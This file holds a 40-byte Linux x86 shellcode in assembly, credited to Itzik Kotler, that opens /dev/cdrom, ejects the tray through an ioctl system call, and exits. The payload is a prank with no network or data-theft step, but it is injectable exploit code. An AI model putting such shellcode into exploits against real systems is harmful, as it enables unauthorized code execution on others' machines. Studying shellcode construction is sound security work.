#
# (linux/x86) eject cd-rom (follows "/dev/cdrom" symlink) + exit() - 40 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		push $0x5
		popl %eax
		xorl %ecx, %ecx
		pushl %ecx
		movb $0x8,%ch
		pushl $0x6d6f7264
		pushl $0x632f7665
		pushl $0x642f2f2f
		movl %esp, %ebx
		int $0x80

		movl %eax, %ebx
		movb $0x36, %al
		movw $0x5309, %cx
		int $0x80

		incl %eax
		int $0x80

